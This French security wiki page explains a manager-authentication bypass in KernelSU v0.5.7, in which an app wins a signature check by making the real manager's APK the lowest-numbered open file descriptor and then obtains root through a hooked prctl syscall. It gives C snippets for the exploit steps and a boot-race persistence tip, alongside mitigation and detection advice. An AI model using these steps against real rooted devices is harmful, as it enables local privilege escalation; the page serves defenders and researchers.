# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Les frameworks de rooting comme KernelSU, APatch, SKRoot et Magisk patchent fréquemment le noyau Linux/Android et exposent des fonctionnalités privilégiées à une application "manager" en espace utilisateur non privilégié via un syscall hooké. Si l'étape d'authentification du manager est défaillante, n'importe quelle application locale peut accéder à ce canal et élever ses privilèges sur des appareils déjà rootés.

Cette page résume les techniques et pièges découverts dans des recherches publiques (notamment l'analyse de KernelSU v0.5.7 par Zimperium) pour aider les équipes rouges et bleues à comprendre les surfaces d'attaque, les primitives d'exploitation et les atténuations robustes.

---
## Modèle d'architecture : canal de manager hooké par syscall

- Le module/patch du noyau hooke un syscall (généralement prctl) pour recevoir des "commandes" de l'espace utilisateur.
- Le protocole est généralement : magic_value, command_id, arg_ptr/len ...
- Une application manager en espace utilisateur s'authentifie d'abord (par exemple, CMD_BECOME_MANAGER). Une fois que le noyau marque l'appelant comme un manager de confiance, des commandes privilégiées sont acceptées :
- Accorder le root à l'appelant (par exemple, CMD_GRANT_ROOT)
- Gérer les listes d'autorisation/de refus pour su
- Ajuster la politique SELinux (par exemple, CMD_SET_SEPOLICY)
- Interroger la version/configuration
- Parce que n'importe quelle application peut invoquer des syscalls, la validité de l'authentification du manager est critique.

Exemple (conception de KernelSU) :
- Syscall hooké : prctl
- Valeur magique pour détourner vers le gestionnaire KernelSU : 0xDEADBEEF
- Les commandes incluent : CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## Flux d'authentification de KernelSU v0.5.7 (tel qu'implémenté)

Lorsque l'espace utilisateur appelle prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU vérifie :

1) Vérification du préfixe de chemin
- Le chemin fourni doit commencer par un préfixe attendu pour l'UID de l'appelant, par exemple /data/data/<pkg> ou /data/user/<id>/<pkg>.
- Référence : core_hook.c (v0.5.7) logique de préfixe de chemin.

2) Vérification de la propriété
- Le chemin doit être possédé par l'UID de l'appelant.
- Référence : core_hook.c (v0.5.7) logique de propriété.

3) Vérification de la signature APK via un scan de la table FD
- Itérer les descripteurs de fichiers ouverts (FDs) du processus appelant.
- Prendre le premier fichier dont le chemin correspond à /data/app/*/base.apk.
- Analyser la signature APK v2 et vérifier contre le certificat officiel du manager.
- Références : manager.c (itération des FDs), apk_sign.c (vérification APK v2).

Si toutes les vérifications passent, le noyau met en cache temporairement l'UID du manager et accepte les commandes privilégiées de cet UID jusqu'à réinitialisation.

---
## Classe de vulnérabilité : faire confiance à "la première APK correspondante" de l'itération FD

Si la vérification de la signature se lie à "la première /data/app/*/base.apk correspondante" trouvée dans la table FD du processus, elle ne vérifie pas réellement le package de l'appelant. Un attaquant peut pré-positionner une APK signée légitimement (celle du vrai manager) de sorte qu'elle apparaisse plus tôt dans la liste FD que sa propre base.apk.

Cette confiance par indirecte permet à une application non privilégiée d'usurper le manager sans posséder la clé de signature du manager.

Propriétés clés exploitées :
- Le scan FD ne se lie pas à l'identité du package de l'appelant ; il ne fait que faire correspondre des chaînes de chemin.
- open() retourne le FD disponible le plus bas. En fermant d'abord les FDs de numéro inférieur, un attaquant peut contrôler l'ordre.
- Le filtre ne vérifie que si le chemin correspond à /data/app/*/base.apk – pas qu'il corresponde au package installé de l'appelant.

---
## Préconditions d'attaque

- L'appareil est déjà rooté avec un framework de rooting vulnérable (par exemple, KernelSU v0.5.7).
- L'attaquant peut exécuter du code non privilégié arbitraire localement (processus d'application Android).
- Le vrai manager ne s'est pas encore authentifié (par exemple, juste après un redémarrage). Certains frameworks mettent en cache l'UID du manager après succès ; vous devez gagner la course.

---
## Plan d'exploitation (KernelSU v0.5.7)

Étapes de haut niveau :
1) Construire un chemin valide vers votre propre répertoire de données d'application pour satisfaire les vérifications de préfixe et de propriété.
2) S'assurer qu'un véritable base.apk de KernelSU Manager est ouvert sur un FD de numéro inférieur à celui de votre propre base.apk.
3) Invoquer prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) pour passer les vérifications.
4) Émettre des commandes privilégiées comme CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY pour persister l'élévation.

Notes pratiques sur l'étape 2 (ordre des FD) :
- Identifier le FD de votre processus pour votre propre /data/app/*/base.apk en parcourant les symlinks /proc/self/fd.
- Fermer un FD bas (par exemple, stdin, fd 0) et ouvrir d'abord l'APK légitime du manager afin qu'il occupe le fd 0 (ou tout index inférieur à celui de votre propre fd base.apk).
- Regrouper l'APK légitime du manager avec votre application afin que son chemin satisfasse le filtre naïf du noyau. Par exemple, le placer sous un sous-chemin correspondant à /data/app/*/base.apk.

Exemples de snippets de code (Android/Linux, illustratifs uniquement) :

Énumérer les FDs ouverts pour localiser les entrées base.apk :
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forcer un FD de numéro inférieur à pointer vers le APK de gestionnaire légitime :
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Gestion de l'authentification via le hook prctl :
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Après succès, commandes privilégiées (exemples) :
- CMD_GRANT_ROOT : promouvoir le processus actuel en root
- CMD_ALLOW_SU : ajouter votre package/UID à la liste blanche pour un su persistant
- CMD_SET_SEPOLICY : ajuster la politique SELinux comme supporté par le framework

Conseil sur la course/persistante :
- Enregistrer un récepteur BOOT_COMPLETED dans AndroidManifest (RECEIVE_BOOT_COMPLETED) pour démarrer tôt après le redémarrage et tenter l'authentification avant le véritable gestionnaire.

---
## Conseils de détection et d'atténuation

Pour les développeurs de framework :
- Lier l'authentification au package/UID de l'appelant, pas à des FDs arbitraires :
- Résoudre le package de l'appelant à partir de son UID et vérifier contre la signature du package installé (via PackageManager) plutôt que de scanner les FDs.
- Si uniquement au niveau du noyau, utiliser une identité d'appelant stable (crédits de tâche) et valider sur une source de vérité stable gérée par init/utilitaire utilisateur, pas par les FDs de processus.
- Éviter les vérifications de préfixe de chemin comme identité ; elles sont trivialement satisfaisables par l'appelant.
- Utiliser un défi-réponse basé sur un nonce sur le canal et effacer toute identité de gestionnaire mise en cache au démarrage ou lors d'événements clés.
- Envisager l'IPC authentifié basé sur binder au lieu de surcharger les syscalls génériques lorsque cela est possible.

Pour les défenseurs/équipe bleue :
- Détecter la présence de frameworks de rooting et de processus de gestion ; surveiller les appels prctl avec des constantes magiques suspectes (par exemple, 0xDEADBEEF) si vous avez une télémétrie du noyau.
- Sur des flottes gérées, bloquer ou alerter sur les récepteurs de démarrage provenant de packages non fiables qui tentent rapidement des commandes de gestion privilégiées après le démarrage.
- S'assurer que les appareils sont mis à jour vers des versions de framework corrigées ; invalider les ID de gestionnaire mis en cache lors de la mise à jour.

Limitations de l'attaque :
- N'affecte que les appareils déjà rootés avec un framework vulnérable.
- Nécessite généralement un redémarrage/une fenêtre de course avant que le gestionnaire légitime ne s'authentifie (certains frameworks mettent en cache l'UID du gestionnaire jusqu'à réinitialisation).

---
## Notes connexes à travers les frameworks

- L'authentification basée sur un mot de passe (par exemple, les versions historiques APatch/SKRoot) peut être faible si les mots de passe sont devinables/bruteforcables ou si les validations sont boguées.
- L'authentification basée sur le package/siganture (par exemple, KernelSU) est plus forte en principe mais doit être liée à l'appelant réel, pas à des artefacts indirects comme les scans de FD.
- Magisk : CVE-2024-48336 (MagiskEoP) a montré que même des écosystèmes matures peuvent être sensibles à la falsification d'identité conduisant à l'exécution de code avec root dans le contexte du gestionnaire.

---
## Références

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
